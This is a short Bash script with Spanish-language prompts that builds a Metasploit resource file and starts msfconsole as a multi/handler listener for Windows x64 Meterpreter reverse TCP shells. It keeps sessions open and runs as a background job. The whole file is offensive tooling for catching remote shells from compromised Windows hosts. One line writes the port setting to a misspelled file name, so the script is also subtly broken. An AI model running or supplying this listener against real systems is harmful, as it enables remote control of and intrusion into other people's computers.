#! /bin/bash
RS="\e[1;31m"
CE="\e[0m"
echo -e "$RS BIENVENIDO AL LISTENER X64 $CE"
echo -e ""
echo -e ""
echo -e "$RS Introduzca el LHOST: $CE"
read -e IP1
echo -e "$RS Introduzca el LPORT: $CE"
read -e LPORT1
payload1="payload/windows/x64/meterpreter/reverse_tcp"
echo "use exploit/multi/handler" > "/root/kuze_scan/rc/windowx64".rc
echo "set LHOST $IP1" >> "/root/kuze_scan/rc/windowx64".rc
echo "set LPORT $LPORT1" >> "/root/kuze_scan/rc/windowsx64".rc
echo "set ExitOnSession false" >> "/root/kuze_scan/rc/windowx64".rc
echo "exploit -j" >> "/root/kuze_scan/rc/windowx64".rc
clear
msfconsole -r "/root/kuze_scan/rc/windowx64".rc
